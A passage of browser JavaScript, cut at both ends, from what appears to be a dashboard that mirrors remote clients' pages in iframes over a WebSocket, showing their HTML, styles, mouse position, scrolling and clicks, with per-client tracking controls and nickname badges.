                            fullscreenBtn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="6" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M8 3H5a2 2 0 0 0-2 2v3m18 0V5a2 2 0 0 0-2-2h-3m0 18h3a2 2 0 0 0 2-2v-3M3 16v3a2 2 0 0 0 2 2h3"></path></svg>';
                            fullscreenBtn.style.padding = '5px';
                            fullscreenBtn.style.border = 'none';
                            fullscreenBtn.style.borderRadius = '4px';
                            fullscreenBtn.style.backgroundColor = '#e1f5fe';
                            fullscreenBtn.style.color = '#0288d1';
                            fullscreenBtn.style.cursor = 'pointer';
                            fullscreenBtn.style.display = 'flex';
                            fullscreenBtn.style.alignItems = 'center';
                            fullscreenBtn.style.justifyContent = 'center';
                            fullscreenBtn.title = 'Toggle fullscreen mode';
                            
                            // Add fullscreen button to controls
                            controlButtons.appendChild(fullscreenBtn);
                            
                            // Add fullscreen functionality
                            fullscreenBtn.addEventListener('click', function() {
                                const contentContainer = document.querySelector(`#${containerId} .content-container`);
                                const iframe = document.querySelector(`#content-frame-${clientId}`);
                                
                                // Check if already in fullscreen mode
                                const isInFullscreen = document.fullscreenElement || 
                                                      document.webkitFullscreenElement || 
                                                      document.mozFullScreenElement || 
                                                      document.msFullscreenElement;
                                
                                if (!isInFullscreen) {
                                    // Enter fullscreen
                                    if (contentContainer.requestFullscreen) {
                                        contentContainer.requestFullscreen();
                                    } else if (contentContainer.webkitRequestFullscreen) {
                                        contentContainer.webkitRequestFullscreen();
                                    } else if (contentContainer.mozRequestFullScreen) {
                                        contentContainer.mozRequestFullScreen();
                                    } else if (contentContainer.msRequestFullscreen) {
                                        contentContainer.msRequestFullscreen();
                                    }
                                    
                                    // Change icon to exit fullscreen
                                    fullscreenBtn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 14h3a2 2 0 0 1 2 2v3m-5-5v-3a2 2 0 0 1 2-2h3m10 0h-3a2 2 0 0 0-2 2v3m5-5v-3a2 2 0 0 0-2-2h-3"></path></svg>';
                                    fullscreenBtn.title = 'Exit fullscreen mode';
                                } else {
                                    // Exit fullscreen
                                    if (document.exitFullscreen) {
                                        document.exitFullscreen();
                                    } else if (document.webkitExitFullscreen) {
                                        document.webkitExitFullscreen();
                                    } else if (document.mozCancelFullScreen) {
                                        document.mozCancelFullScreen();
                                    } else if (document.msExitFullscreen) {
                                        document.msExitFullscreen();
                                    }
                                    
                                    // Change icon to enter fullscreen
                                    fullscreenBtn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M8 3H5a2 2 0 0 0-2 2v3m18 0V5a2 2 0 0 0-2-2h-3m0 18h3a2 2 0 0 0 2-2v-3M3 16v3a2 2 0 0 0 2 2h3"></path></svg>';
                                    fullscreenBtn.title = 'Enter fullscreen mode';
                                }
                            });
                            
                            // Add listener for fullscreen change events to update button icon
                            document.addEventListener('fullscreenchange', function() {
                                updateFullscreenButtonIcon(fullscreenBtn);
                            });
                            document.addEventListener('webkitfullscreenchange', function() {
                                updateFullscreenButtonIcon(fullscreenBtn);
                            });
                            document.addEventListener('mozfullscreenchange', function() {
                                updateFullscreenButtonIcon(fullscreenBtn);
                            });
                            document.addEventListener('MSFullscreenChange', function() {
                                updateFullscreenButtonIcon(fullscreenBtn);
                            });
                            
                            // Helper function to update fullscreen button icon
                            function updateFullscreenButtonIcon(button) {
                                const isInFullscreen = document.fullscreenElement || 
                                                      document.webkitFullscreenElement || 
                                                      document.mozFullScreenElement || 
                                                      document.msFullscreenElement;
                                                      
                                if (isInFullscreen) {
                                    button.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 14h3a2 2 0 0 1 2 2v3m-5-5v-3a2 2 0 0 1 2-2h3m10 0h-3a2 2 0 0 0-2 2v3m5-5v-3a2 2 0 0 0-2-2h-3"></path></svg>';
                                    button.title = 'Exit fullscreen mode';
                                } else {
                                    button.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M8 3H5a2 2 0 0 0-2 2v3m18 0V5a2 2 0 0 0-2-2h-3m0 18h3a2 2 0 0 0 2-2v-3M3 16v3a2 2 0 0 0 2 2h3"></path></svg>';
                                    button.title = 'Enter fullscreen mode';
                                }
                            }
                            
                            // Create client badge
                            const clientBadge = document.createElement('span');
                            clientBadge.className = 'client-badge';
                            clientBadge.id = `client-badge-${clientId}`;
                            clientBadge.style.backgroundColor = '#2196F3';
                            clientBadge.style.color = 'white';
                            clientBadge.style.padding = '3px 8px';
                            clientBadge.style.borderRadius = '12px';
                            clientBadge.style.fontSize = '12px';
                            
                            // Store the full client ID as a data attribute for easier access
                            clientBadge.dataset.clientId = clientId;
                            
                            // Override the textContent setter to prevent changes
                            let badgeText = `Client: ${clientId.split('_').pop().substring(0, 8)}`;
                            Object.defineProperty(clientBadge, 'textContent', {
                                get: function() {
                                    return badgeText;
                                },
                                set: function(newValue) {
                                    // Only allow changes from our nickname code
                                    if (newValue.startsWith('Client: ') && 
                                        !newValue.includes(clientId.split('_').pop().substring(0, 8))) {
                                        console.log(`Badge text set to: ${newValue}`);
                                        badgeText = newValue;
                                        this.innerText = newValue;
                                    } else if (this.allowTextChange) {
                                        badgeText = newValue;
                                        this.innerText = newValue;
                                    } else {
                                        console.log(`Prevented badge text change to: ${newValue}`);
                                    }
                                },
                                configurable: true
                            });
                            
                            // Check if this client has a nickname in our clients object
                            let displayName = clientId.split('_').pop().substring(0, 8);
                            let foundNickname = false;
                            
                            // Find client by clientId in our clients object - try exact match first
                            for (const key in clients) {
                                if (clients[key].clientId === clientId && clients[key].nickname) {
                                    displayName = clients[key].nickname;
                                    console.log(`Found nickname for client ${clientId}: ${displayName}`);
                                    foundNickname = true;
                                    break;
                                }
                            }
                            
                            // If no exact match, try partial match with the shortened ID
                            if (!foundNickname) {
                                const shortId = clientId.split('_').pop().substring(0, 8);
                                for (const key in clients) {
                                    if (clients[key].clientId && 
                                        clients[key].clientId.includes(shortId) && 
                                        clients[key].nickname) {
                                        displayName = clients[key].nickname;
                                        console.log(`Found nickname by partial match for client ${clientId}: ${displayName}`);
                                        
                                        // Store this relationship for future updates
                                        window.clientIdMappings = window.clientIdMappings || {};
                                        window.clientIdMappings[clientId] = clients[key].clientId;
                                        console.log(`Mapped client ID ${clientId} to ${clients[key].clientId}`);
                                        break;
                                    }
                                }
                            }
                            
                            // Allow the initial text change
                            clientBadge.allowTextChange = true;
                            clientBadge.textContent = `Client: ${displayName}`;
                            console.log(`Set client badge text to: Client: ${displayName}`);
                            clientBadge.allowTextChange = false;
                            clientBadge.title = `Client ID: ${clientId}`; // Show full ID on hover
                            
                            // Create tracking toggle button for this specific client
                            const trackingToggle = document.createElement('button');
                            trackingToggle.id = `tracking-toggle-${clientId}`;
                            trackingToggle.className = 'toggle';
                            trackingToggle.textContent = 'Start Tracking';
                            
                            // Button to clean all templates
                            const cleanTemplatesBtn = document.createElement('button');
                            cleanTemplatesBtn.id = `clean-templates-${clientId}`;
                            cleanTemplatesBtn.className = 'toggle';
                            cleanTemplatesBtn.textContent = 'Clean All Templates';
                            cleanTemplatesBtn.style.marginLeft = '5px';
                            
                            // Create Clean button for clearing event handlers
                            const cleanBtn = document.createElement('button');
                            cleanBtn.id = `clean-handlers-${clientId}`;
                            cleanBtn.className = 'toggle';
                            cleanBtn.textContent = 'Clean';
                            cleanBtn.style.marginLeft = '5px';
                            cleanBtn.style.background = '#f44336';
                            cleanBtn.title = 'Clear all event handlers';
                            
                            const selectionToggle = document.createElement('button');
                            selectionToggle.id = `selection-toggle-${clientId}`;
                            selectionToggle.className = 'toggle';
                            selectionToggle.textContent = 'Selection Mode: OFF';
                            
                            const statusBadge = document.createElement('span');
                            statusBadge.className = 'viewer-status';
                            statusBadge.id = `viewer-status-${clientId}`;
                            statusBadge.textContent = 'Disconnected';
                            
                            const selectionIndicator = document.createElement('span');
                            selectionIndicator.className = 'selection-mode-indicator';
                            selectionIndicator.id = `selection-indicator-${clientId}`;
                            selectionIndicator.textContent = 'Selection Mode: ON';
                            
                            // Set default tracking state to false (off) - user needs to start manually
                            container.dataset.tracking = 'false';
                            
                            // Make container minimized by default
                            const contentContainerInit = container.querySelector('.content-container');
                            if (contentContainerInit) {
                                contentContainerInit.style.maxHeight = '0';
                                contentContainerInit.style.opacity = '0';
                                contentContainerInit.style.visibility = 'hidden';
                            }
                            
                            // Don't add active class initially
                            // trackingToggle.classList.add('active');
                            
                            // Add event listener for tracking toggle
                            trackingToggle.addEventListener('click', function() {
                                const isTracking = container.dataset.tracking === 'true';
                                const newTrackingState = !isTracking;
                                container.dataset.tracking = newTrackingState.toString();
                                
                                // Get content container for minimization
                                const contentContainer = container.querySelector('.content-container');
                                const mousePositionIndicator = container.querySelector('.mouse-position-indicator');
                                
                                if (newTrackingState) {
                                    trackingToggle.textContent = 'Stop Tracking';
                                    trackingToggle.classList.add('active');
                                    if (statusBadge) {
                                        statusBadge.textContent = 'Connected';
                                        statusBadge.classList.add('connected');
                                    }
                                    
                                    if (contentContainer) {
                                        contentContainer.style.maxHeight = '800px';
                                        contentContainer.style.opacity = '1';
                                        contentContainer.style.visibility = 'visible';
                                    }
                                    
                                    if (mousePositionIndicator) {
                                        mousePositionIndicator.style.display = 'block';
                                    }
                                    
                                    container.classList.remove('minimized');
                                    
                                    if (window.websocket && window.websocket.readyState === WebSocket.OPEN) {
                                        window.websocket.send(JSON.stringify({
                                            type: 'tracking-control',
                                            enabled: true,
                                            targetClientId: clientId,
                                            timestamp: new Date().toISOString()
                                        }));
                                        
                                        // Request fresh content
                                        //window.websocket.send(JSON.stringify({
                                        //    type: 'request-content',
                                          //  timestamp: new Date().toISOString()
                                       // }));
                                    }
                                } else {
                                    trackingToggle.textContent = 'Start Tracking';
                                    trackingToggle.classList.remove('active');
                                    if (statusBadge) {
                                        statusBadge.textContent = 'Disconnected';
                                        statusBadge.classList.remove('connected');
                                    }
                                    
                                    if (contentContainer) {
                                        contentContainer.style.maxHeight = '0';
                                        contentContainer.style.opacity = '0';
                                        contentContainer.style.visibility = 'hidden';
                                    }
                                    
                                    // Hide mouse position indicator
                                    if (mousePositionIndicator) {
                                        mousePositionIndicator.style.display = 'none';
                                    }
                                    
                                    container.classList.add('minimized');
                                    
                                    if (window.websocket && window.websocket.readyState === WebSocket.OPEN) {
                                        window.websocket.send(JSON.stringify({
                                            type: 'tracking-control',
                                            enabled: false,
                                            targetClientId: clientId,
                                            timestamp: new Date().toISOString()
                                        }));
                                    }
                                }
                            });
                            
                            // Add clean button handler
                            cleanBtn.addEventListener('click', function() {
                                if (window.websocket && window.websocket.readyState === WebSocket.OPEN) {
                                    window.websocket.send(JSON.stringify({
                                        type: 'clean-event-handlers',
                                        targetClientId: clientId
                                    }));
                                }
                            });
                            
                            // Clean all templates button handler (server-side only)
                            cleanTemplatesBtn.addEventListener('click', function() {
                                clearServerTemplates();
                                alert('All server-side event templates cleared. Client templates remain untouched.');
                            });
                            
                            // Add elements to header
                            // Add title to title area
                            titleArea.appendChild(title);
                            
                            // Add elements to header with proper organization
                            header.appendChild(titleArea);
                            
                            // Create right side controls area
                            const rightControls = document.createElement('div');
                            rightControls.style.display = 'flex';
                            rightControls.style.alignItems = 'center';
                            rightControls.style.gap = '8px';
                            
                            // Add client badge and controls to right side
                            rightControls.appendChild(clientBadge);
                            rightControls.appendChild(controlButtons);
                            
                            // Add right controls to header
                            header.appendChild(rightControls);
                            
                            container.appendChild(header);
                            
                            const viewerControls = document.createElement('div');
                            viewerControls.className = 'viewer-controls';
                            
                            const controlsLeft = document.createElement('div');
                            controlsLeft.className = 'control-group';
                            controlsLeft.appendChild(statusBadge);
                            controlsLeft.appendChild(selectionIndicator);
                            
                            const controlsRight = document.createElement('div');
                            controlsRight.className = 'control-group';
                            
                            // Style the buttons using classes
                            cleanTemplatesBtn.className = 'btn btn-danger btn-small';
                            cleanBtn.className = 'btn btn-warning btn-small';
                            trackingToggle.className = 'btn btn-primary btn-small';
                            selectionToggle.className = 'btn btn-info btn-small';
                            
                            controlsRight.appendChild(cleanTemplatesBtn);
                            controlsRight.appendChild(cleanBtn);
                            controlsRight.appendChild(trackingToggle);
                            controlsRight.appendChild(selectionToggle);
                            
                            viewerControls.appendChild(controlsLeft);
                            viewerControls.appendChild(controlsRight);
                            
                            container.appendChild(viewerControls);
                            
                            // Setup a recurring interval to keep the nickname updated
                            // This ensures it doesn't get overridden by other code
                            const badgeUpdateInterval = setInterval(() => {
                                // Find if this client has a nickname in any of our stored clients
                                let foundNickname = false;
                                
                                for (const key in clients) {
                                    // Try exact match first
                                    if (clients[key].clientId === clientId && clients[key].nickname) {
                                        if (clientBadge.textContent !== `Client: ${clients[key].nickname}`) {
                                            // Allow the text change for our nickname update
                                            clientBadge.allowTextChange = true;
                                            
                                            clientBadge.textContent = `Client: ${clients[key].nickname}`;
                                            console.log(`Updated badge with nickname from interval: ${clients[key].nickname}`);
                                            
                                            // Reset the flag
                                            clientBadge.allowTextChange = false;
                                        }
                                        foundNickname = true;
                                        break;
                                    }
                                    
                                    // Try partial match with short ID
                                    const shortId = clientId.split('_').pop().substring(0, 8);
                                    if (clients[key].clientId && 
                                        clients[key].clientId.includes(shortId) && 
                                        clients[key].nickname) {
                                        if (clientBadge.textContent !== `Client: ${clients[key].nickname}`) {
                                            // Allow the text change for our nickname update
                                            clientBadge.allowTextChange = true;
                                            
                                            clientBadge.textContent = `Client: ${clients[key].nickname}`;
                                            console.log(`Updated badge with nickname from interval (partial match): ${clients[key].nickname}`);
                                            
                                            // Reset the flag
                                            clientBadge.allowTextChange = false;
                                        }
                                        
                                        // Store this relationship for future updates
                                        window.clientIdMappings = window.clientIdMappings || {};
                                        window.clientIdMappings[clientId] = clients[key].clientId;
                                        
                                        foundNickname = true;
                                        break;
                                    }
                                }
                                
                                // Store the interval ID in a data attribute so we can clear it if needed
                                clientBadge.dataset.updateInterval = badgeUpdateInterval;
                                
                                // If we've been running for more than 30 seconds and haven't found a nickname, stop the interval
                                if (!foundNickname && Date.now() - startTime > 30000) {
                                    console.log(`No nickname found for client ${clientId} after 30 seconds, stopping interval`);
                                    clearInterval(badgeUpdateInterval);
                                }
                            }, 1000);
                            
                            // Store the start time to limit how long we keep checking
                            const startTime = Date.now();
                            
                            // Add mouse position indicator
                            const mousePositionIndicator = document.createElement('div');
                            mousePositionIndicator.id = `mouse-position-${clientId}`;
                            mousePositionIndicator.className = 'mouse-position-indicator';
                            mousePositionIndicator.style.padding = '5px 10px';
                            mousePositionIndicator.style.backgroundColor = '#e3f2fd';
                            mousePositionIndicator.style.borderBottom = '1px solid #ddd';
                            mousePositionIndicator.style.fontSize = '12px';
                            mousePositionIndicator.style.display = 'none'; // Start hidden
                            mousePositionIndicator.innerHTML = 'Mouse: X: <span class="x-coord">0</span>, Y: <span class="y-coord">0</span>';
                            container.appendChild(mousePositionIndicator);
                            
                            // Add content container with iframe
                            const contentContainer = document.createElement('div');
                            contentContainer.className = 'content-container';
                            contentContainer.style.position = 'relative';
                            contentContainer.style.height = '800px';
                            contentContainer.style.minHeight = '80vh';
                            contentContainer.style.overflow = 'auto';
                            
                            // Start minimized
                            contentContainer.style.maxHeight = '0';
                            contentContainer.style.opacity = '0';
                            contentContainer.style.visibility = 'hidden';
                            
                            // Create iframe
                            const iframe = document.createElement('iframe');
                            iframe.id = `content-frame-${clientId}`;
                            iframe.style.width = '100%';
                            iframe.style.height = '100%';
                            iframe.style.border = 'none';
                            contentContainer.appendChild(iframe);
                            
                            // Create mouse cursor element
                            const mouseCursor = document.createElement('div');
                            mouseCursor.id = `cursor-${clientId}`;
                            mouseCursor.className = 'client-cursor';
                            mouseCursor.style.transform = 'translate(-50%, -50%)';
                            mouseCursor.style.left = '0';
                            mouseCursor.style.top = '0';
                            mouseCursor.style.display = 'none'; // Hidden until mouse moves
                            mouseCursor.setAttribute('data-client', clientId); // Store client ID for reference
                            contentContainer.appendChild(mouseCursor);
                            
                            container.appendChild(contentContainer);
                            
                            // Add container to the grid
                            const previewGrid = document.getElementById('client-preview-grid');
                            if (previewGrid) {
                                previewGrid.appendChild(container);
                            } else {
                                // Create grid if it doesn't exist
                                const grid = document.createElement('div');
                                grid.id = 'client-preview-grid';
                                grid.style.display = 'grid';
                                grid.style.gridTemplateColumns = 'repeat(auto-fill, minmax(400px, 1fr))';
                                grid.style.gap = '20px';
                                grid.style.margin = '20px 0';
                                grid.appendChild(container);
                                
                                // Find where to add the grid - preferably in the preview section
                                const previewSection = document.getElementById('preview-content');
                                if (previewSection) {
                                    previewSection.appendChild(grid);
                                } else {
                                    // Fallback to adding it to the body
                                    document.body.appendChild(grid);
                                }
                            }
                            
                            console.log(`Created new preview container for client ${clientId}`);
                        }
                        
                        // Update iframe content
                        const iframe = document.getElementById(`content-frame-${clientId}`);
                        if (iframe) {
                            try {
                                console.log(`Updating HTML content for client ${clientId}`);
                                const doc = iframe.contentDocument || iframe.contentWindow.document;
                                const baseHref = pageUrl || '/';
                                window._clientHtmlCache[clientId] = { pageUrl, pageTitle };
                                const styleTags = (window._clientStyleCache && window._clientStyleCache[clientId]) ? window._clientStyleCache[clientId]
                                  .filter(s => !!s.content)
                                  .map(s => `<style>${s.content}</style>`) : [];
                                const linkTags = (window._clientStyleCache && window._clientStyleCache[clientId]) ? window._clientStyleCache[clientId]
                                  .filter(s => !!s.href)
                                  .map(s => `<link rel=\"stylesheet\" href=\"${s.href}\">`) : [];
                                const headExtra = [...linkTags, ...styleTags].join('');
                                const fullHtml = `<!DOCTYPE html><html><head><meta charset=\"utf-8\"><base href=\"${baseHref}\">${headExtra}</head><body>${htmlContent}</body></html>`;
                                doc.open();
                                doc.write(fullHtml);
                                doc.close();
                                
                                // Update title in header if it changed
                                const titleElement = container.querySelector('.page-title');
                                if (titleElement) {
                                    titleElement.textContent = pageTitle;
                                }
                                
                                // Update client badge with nickname if available
                                const clientBadge = container.querySelector('.client-badge');
                                if (clientBadge) {
                                    // Find if this client has a nickname
                                    let foundNickname = false;
                                    
                                    // Try exact match first
                                    for (const key in clients) {
                                        if (clients[key].clientId === clientId && clients[key].nickname) {
                                            clientBadge.textContent = `Client: ${clients[key].nickname}`;
                                            console.log(`Updated client badge to nickname: ${clients[key].nickname}`);
                                            foundNickname = true;
                                            break;
                                        }
                                    }
                                    
                                    // If no exact match, try partial match
                                    if (!foundNickname) {
                                        const shortId = clientId.split('_').pop().substring(0, 8);
                                        for (const key in clients) {
                                            if (clients[key].clientId && 
                                                clients[key].clientId.includes(shortId) && 
                                                clients[key].nickname) {
                                                clientBadge.textContent = `Client: ${clients[key].nickname}`;
                                                console.log(`Updated client badge to nickname (partial match): ${clients[key].nickname}`);
                                                
                                                // Store mapping for future updates
                                                window.clientIdMappings = window.clientIdMappings || {};
                                                window.clientIdMappings[clientId] = clients[key].clientId;
                                                
                                                foundNickname = true;
                                                break;
                                            }
                                        }
                                    }
                                    
                                    // If we found a nickname, make sure it persists
                                    if (foundNickname) {
                                        // Store the current text so we can check if it changes
                                        const currentText = clientBadge.textContent;
                                        
                                        // Set up a MutationObserver to detect if something changes the text
                                        const observer = new MutationObserver((mutations) => {
                                            mutations.forEach((mutation) => {
                                                if (mutation.type === 'characterData' || mutation.type === 'childList') {
                                                    if (clientBadge.textContent !== currentText) {
                                                        console.log(`Badge text changed from "${currentText}" to "${clientBadge.textContent}", restoring`);
                                                        clientBadge.textContent = currentText;
                                                    }
                                                }
                                            });
                                        });
                                        
                                        // Start observing
                                        observer.observe(clientBadge, { 
                                            characterData: true, 
                                            childList: true,
                                            subtree: true 
                                        });
                                        
                                        // Store the observer in a data attribute so we can disconnect it if needed
                                        clientBadge.dataset.observer = observer;
                                    }
                                }
                                
                                console.log(`Successfully updated HTML content for client ${clientId}`);
                            } catch (error) {
                                console.error(`Error updating iframe content for client ${clientId}:`, error);
                            }
                        }
                    }
                    
                    // Handle stylesheets from client to apply in iframe
                    else if (data.type === 'stylesheets' && data.clientId) {
                        const clientId = data.clientId;
                        const iframe = document.getElementById(`content-frame-${clientId}`);
                        if (data.styleSheets && Array.isArray(data.styleSheets)) {
                            window._clientStyleCache[clientId] = data.styleSheets;
                        }
                        if (iframe && data.styleSheets && Array.isArray(data.styleSheets)) {
                            try {
                                const doc = iframe.contentDocument || iframe.contentWindow.document;
                                const head = doc.head || doc.getElementsByTagName('head')[0] || doc.documentElement;
                                data.styleSheets.forEach(sheet => {
                                    if (sheet.content) {
                                        const styleEl = doc.createElement('style');
                                        styleEl.type = 'text/css';
                                        styleEl.textContent = sheet.content;
                                        head.appendChild(styleEl);
                                    } else if (sheet.href) {
                                        if (!doc.querySelector(`link[href="${sheet.href}"]`)) {
                                            const linkEl = doc.createElement('link');
                                            linkEl.rel = 'stylesheet';
                                            linkEl.href = sheet.href;
                                            head.appendChild(linkEl);
                                        }
                                    }
                                });
                            } catch (err) {
                                console.error('Error applying stylesheets to iframe:', err);
                            }
                        }
                    }
                    
                    else if (data.type === 'mouse-position') {
                        const clientId = data.clientId;
                        
                        // Check if this specific client's tracking is enabled (if clientId provided)
                        if (clientId) {
                            const clientContainer = document.getElementById(`preview-container-${clientId}`);
                            if (clientContainer && clientContainer.dataset.tracking !== 'true') {
                                // Skip processing if tracking is disabled for this client
                                return;
                            }
                        }
                        
                        const x = data.x;
                        const y = data.y;
                        const xPercent = data.xPercent || (data.x / data.viewportWidth * 100);
                        const yPercent = data.yPercent || (data.y / data.viewportHeight * 100);
                        
                        // Update the main mouse position display in the header
                        const mouseX = document.getElementById('mouseX');
                        const mouseY = document.getElementById('mouseY');
                        if (mouseX && mouseY) {
                            mouseX.textContent = Math.round(x);
                            mouseY.textContent = Math.round(y);
                        }
                        
                        // Update the detailed position display in preview section
                        const mouseXDetail = document.getElementById('mouseXDetail');
                        const mouseYDetail = document.getElementById('mouseYDetail');
                        const mouseClientId = document.getElementById('mouseClientId');
                        const mouseXPercent = document.getElementById('mouseXPercent');
                        const mouseYPercent = document.getElementById('mouseYPercent');
                        const mouseLastUpdate = document.getElementById('mouseLastUpdate');
                        
                        if (mouseXDetail && mouseYDetail && mouseClientId) {
                            // Update with more precise values
                            mouseXDetail.textContent = x.toFixed(2);
                            mouseYDetail.textContent = y.toFixed(2);
                            
                            // Calculate percentages if available
                            if (mouseXPercent && mouseYPercent) {
                                mouseXPercent.textContent = Math.round(xPercent);
                                mouseYPercent.textContent = Math.round(yPercent);
                            }
                            
                            // Update last update time
                            if (mouseLastUpdate) {
                                const now = new Date();
                                mouseLastUpdate.textContent = now.toLocaleTimeString();
                            }
                            
                            // Show client ID details
                            if (data.clientId) {
                                const shortClientId = data.clientId.split('_').pop().substring(0, 8);
                                mouseClientId.textContent = shortClientId;
                                mouseClientId.title = data.clientId; // Show full ID on hover
                            }
                            
                            // Add flash effect to the detail boxes
                            const boxes = document.querySelectorAll('.position-box');
                            boxes.forEach(box => {
                                box.style.boxShadow = '0 0 8px rgba(33, 150, 243, 0.6)';
                                setTimeout(() => {
                                    box.style.boxShadow = '0 2px 5px rgba(0,0,0,0.1)';
                                }, 300);
                            });
                        }
                        
                        // Update client-specific mouse cursor and position indicator
                        const mouseCursor = document.getElementById(`cursor-${clientId}`);
                        const positionIndicator = document.getElementById(`mouse-position-${clientId}`);
                        const contentFrame = document.getElementById(`content-frame-${clientId}`);
                        
                        if (contentFrame && mouseCursor && positionIndicator) {
                            const contentContainer = contentFrame.parentElement;
                            
                            // Make sure cursor is visible
                            mouseCursor.style.display = 'block';
                            
                            // Get container dimensions for accurate positioning
                            const containerWidth = contentContainer.offsetWidth;
                            const containerHeight = contentContainer.offsetHeight;
                            
                            // Calculate position based on container dimensions
                            const cursorX = (xPercent / 100) * containerWidth;
                            const cursorY = (yPercent / 100) * containerHeight;
                            
                            // Apply position with transform for smooth animation
                            mouseCursor.style.left = `${cursorX}px`;
                            mouseCursor.style.top = `${cursorY}px`;
                            
                            // Add pulse animation on movement
                            mouseCursor.classList.add('cursor-pulse');
                            setTimeout(() => mouseCursor.classList.remove('cursor-pulse'), 500);
                            
                            // Update position text
                            const xCoord = positionIndicator.querySelector('.x-coord');
                            const yCoord = positionIndicator.querySelector('.y-coord');
                            if (xCoord && yCoord) {
                                xCoord.textContent = x.toFixed(0);
                                yCoord.textContent = y.toFixed(0);
                            }
                            
                            // Flash the indicator
                            positionIndicator.style.backgroundColor = '#bbdefb';
                            setTimeout(() => {
                                positionIndicator.style.backgroundColor = '#e3f2fd';
                            }, 300);
                        }
                    }
                    
                    // Handle scroll position updates
                    else if (data.type === 'scroll-position' && data.clientId) {
                        const clientId = data.clientId;
                        
                        // Check if this specific client's tracking is enabled
                        const clientContainer = document.getElementById(`preview-container-${clientId}`);
                        if (clientContainer && clientContainer.dataset.tracking !== 'true') {
                            // Skip processing if tracking is disabled for this client
                            return;
                        }
                        
                        const scrollX = data.scrollX || 0;
                        const scrollY = data.scrollY || 0;
                        
                        // Get the iframe for this client
                        const iframe = document.getElementById(`content-frame-${clientId}`);
                        if (iframe) {
                            // Apply scroll position to the iframe
                            console.log(`Setting scroll for client ${clientId}: ${scrollX}, ${scrollY}`);
                            
                            // Access the iframe's document and scroll it
                            try {
                                const iframeWindow = iframe.contentWindow;
                                if (iframeWindow) {
                                    iframeWindow.scrollTo(scrollX, scrollY);
                                }
                            } catch (error) {
                                console.error('Error scrolling iframe:', error);
                            }
                        }
                    }
                    
                    // Handle mouse click events
                    else if ((data.type === 'mouse-click' || data.type === 'mouse-down-start' || data.type === 'mouse-down-end' || data.type === 'mouse-long-click') && data.clientId) {
                        const clientId = data.clientId;
                        
                        // Check if this specific client's tracking is enabled
                        const clientContainer = document.getElementById(`preview-container-${clientId}`);
                        if (clientContainer && clientContainer.dataset.tracking !== 'true') {
                            // Skip processing if tracking is disabled for this client
                            return;
                        }
                        
                        const button = data.button;
                        
                        // Get the cursor for this client
                        const mouseCursor = document.getElementById(`cursor-${clientId}`);
                        if (mouseCursor) {
                            // For mouse down events, set the color directly
                            if (data.type === 'mouse-down-start') {
                                // Set cursor fill color based on button type
                                if (button === 'right') {
                                    // Change SVG fill color to blue
                                    mouseCursor.style.backgroundImage = `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 320 512'%3E%3Cpath fill='%230000ff' d='M302.189 329.126H196.105l55.831 135.993c3.889 9.428-1.286 20.125-10.714 24.014l-21.442 8.814c-9.428 3.889-20.125-1.286-24.014-10.714l-55.831-135.993-81.766 89.142c-8.011 8.739-22.188 1.907-22.188-10.733V15c0-12.57 14.027-19.436 22.187-10.732l267.221 290.857c8.08 8.804 2.136 22.365-10.302 24z'%3E%3C/path%3E%3C/svg%3E")`;
                                } else {
                                    // Change SVG fill color to red
                                    mouseCursor.style.backgroundImage = `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 320 512'%3E%3Cpath fill='%23ff0000' d='M302.189 329.126H196.105l55.831 135.993c3.889 9.428-1.286 20.125-10.714 24.014l-21.442 8.814c-9.428 3.889-20.125-1.286-24.014-10.714l-55.831-135.993-81.766 89.142c-8.011 8.739-22.188 1.907-22.188-10.733V15c0-12.57 14.027-19.436 22.187-10.732l267.221 290.857c8.08 8.804 2.136 22.365-10.302 24z'%3E%3C/path%3E%3C/svg%3E")`;
                                }
                                console.log(`Mouse down event: ${button} for client ${clientId}`);
                            }
                            // For mouse up events, restore default color
                            else if (data.type === 'mouse-down-end') {
                                // Reset to green cursor
                                mouseCursor.style.backgroundImage = `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 320 512'%3E%3Cpath fill='%2300cc00' d='M302.189 329.126H196.105l55.831 135.993c3.889 9.428-1.286 20.125-10.714 24.014l-21.442 8.814c-9.428 3.889-20.125-1.286-24.014-10.714l-55.831-135.993-81.766 89.142c-8.011 8.739-22.188 1.907-22.188-10.733V15c0-12.57 14.027-19.436 22.187-10.732l267.221 290.857c8.08 8.804 2.136 22.365-10.302 24z'%3E%3C/path%3E%3C/svg%3E")`;
                                console.log(`Mouse up event for client ${clientId}`);
                            }
                            // For single clicks, flash the color
                            else if (data.type === 'mouse-click') {
                                // Set cursor fill color based on button type
                                if (button === 'right') {
                                    // Change SVG fill color to blue
                                    mouseCursor.style.backgroundImage = `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 320 512'%3E%3Cpath fill='%230000ff' d='M302.189 329.126H196.105l55.831 135.993c3.889 9.428-1.286 20.125-10.714 24.014l-21.442 8.814c-9.428 3.889-20.125-1.286-24.014-10.714l-55.831-135.993-81.766 89.142c-8.011 8.739-22.188 1.907-22.188-10.733V15c0-12.57 14.027-19.436 22.187-10.732l267.221 290.857c8.08 8.804 2.136 22.365-10.302 24z'%3E%3C/path%3E%3C/svg%3E")`;
                                } else {
                                    // Change SVG fill color to red
